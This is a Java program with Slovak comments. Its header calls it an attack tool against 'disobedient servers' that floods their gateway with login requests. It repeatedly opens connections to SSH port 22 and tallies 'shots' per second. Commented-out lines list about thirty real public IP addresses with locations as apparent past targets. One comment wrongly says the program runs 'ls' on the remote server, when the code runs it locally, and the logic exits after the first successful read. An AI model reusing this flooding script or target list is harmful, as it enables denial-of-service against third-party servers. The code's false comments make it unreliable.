/*
 *  RaTaTaTa.java
 * 
 * Maly, utociaci programcok proti neposlusnym serverom.
 * 
 * Zahlti branu servera poziadavkami o logging.
 *
 * 2013-06-24  -  Robo Vanya
 * 
 **********************************************************************/
package test;

    import java.io.*;   
    import java.net.Socket;   
    import java.util.Calendar;

    public class RaTaTaTa {   
        public static void main(String args[]) {   
            String s = null;   
            String srv = "",sec = "0", lastSec = "0";
 
            double numShots = 0;
            double numSecs  = 0;
            double priemer  = 0;
            int    numShotsPerSec = 0;
            
            while (true) {
            Calendar cld = Calendar.getInstance();
            sec = String.valueOf(cld.get(Calendar.SECOND));
            if (!sec.equals(lastSec)) {
               lastSec = sec;
               numSecs++;
               priemer = (double) (numShots / numSecs);
            }
            try {   
               // spustame Unix-acky "ls" prikaz 
               // na listovanie adresara na vzdialenom svinskom serveri
               
               // USA - Portsmouth Rye, ulica School Garden -- tito boli surovy :-)
               // Socket s1=new Socket("64.140.206.237",22);     

                // Rusi - adresa skryta
                // Socket s1=new Socket("91.194.254.153",22);    
               
                // Cina - Beijing
                // Socket s1=new Socket("218.3.251.252",22);     
                
                // Kanada - Montreal
                // Socket s1=new Socket("184.107.48.183",22);     
                 
                // USA - Westerville
                // Socket s1=new Socket("173.244.161.132",22);     
                 
                // Cina - Shanghai
                // Socket s1=new Socket("222.73.237.5",22);   
               
                // Greece - Attiki Athens
                // Socket s1=new Socket("188.40.38.253",22);     

                // Cina - Tongwei
                // Socket s1=new Socket("61.155.177.58",22);     

                 // Cina - Beijing
                 // Socket s1=new Socket("88.198.221.67",22);     

                 // Mexico
                 //Socket s1=new Socket("75.144.227.100",22);     
                
                 // England-London
                 // Socket s1=new Socket("109.71.125.5",22);     
                 
                 //Japan-Tokyo
                 //Socket s1=new Socket("153.122.22.152",22);     
                 //ponyexpress.eu - France
                 //Socket s1=new Socket("62.210.205.2",22);     
                 // test na NZBD
                 // Socket s1=new Socket("82.119.116.2",22);     
                 //ponyexpress.eu - France
                 //Socket s1=new Socket("190.94.134.194",22);   
                 // USE cambridge
                 // Socket s1=new Socket("149.202.179.127",22);     
                 // Switzerland - Zurich
                 //  Socket s1=new Socket("179.43.177.66",22);     
//                 Socket s1=new Socket("212.92.108.124",22);     
//                 Socket s1=new Socket("212.92.119.1",22);     
//                 Socket s1=new Socket("212.92.124.191",22);     
//                 Socket s1=new Socket("158.195.18.142",22);     
//                 Socket s1=new Socket("171.235.81.10",22);     
//                 Socket s1=new Socket("164.52.24.164",22);     
//                 Socket s1=new Socket("185.66.200.152",22);     
                 Socket s1=new Socket("192.168.1.1",22);     
                PrintWriter wr=new PrintWriter(new     
                 OutputStreamWriter(s1.getOutputStream()),true);    
                 wr.println("Cau. Pozdravujem z prilahleho vesmiru. Make Love, not War ! :-)");    
                 
//                 wr.println("test na sebe (sa) :-))");    
                 wr.flush();    
                 numShots++;
                 BufferedReader br =
                    new BufferedReader(new  InputStreamReader(s1.getInputStream()));     
      
                 srv = br.readLine();    
      
                // pokus o spustenie listovacieho script-u na vzdialenom serveri
                Process p = Runtime.getRuntime().exec("ls");   
      
                 BufferedReader stdInput = new BufferedReader(new    
                     InputStreamReader(p.getInputStream()));   
      
      
                BufferedReader stdError = new BufferedReader(new    
                     InputStreamReader(p.getErrorStream()));   
      
                // citanie navratovej hodnoti spustaneho script-u
                System.out.println("Standardny vystup prikazu:\n");   
                while ((s = stdInput.readLine()) != null) {   
                    System.out.println(s);   
                    System.exit(0);   
                }   
      
                // citanie moznych standardnych chyb pri spustani prikazu   
                System.out.println("Standardne chyby pocas vykonavania prikazu (ked boli):\n");   
                while ((s = stdError.readLine()) != null) {   
                    System.out.println(s);   
                }     
      
                System.exit(0);   
      
            }   
      
            catch (IOException e) {   
                System.out.println(numShots + "-tý výstrel na " 
                          + srv + " priemerný počet konnektov za sekundu: " + priemer 
                          + "\nDľžka útoku: " + numSecs + " sekúnd.");   
               // e.printStackTrace();   
                //System.exit(-1);   
            }   
            }
      
        }   
      
    }   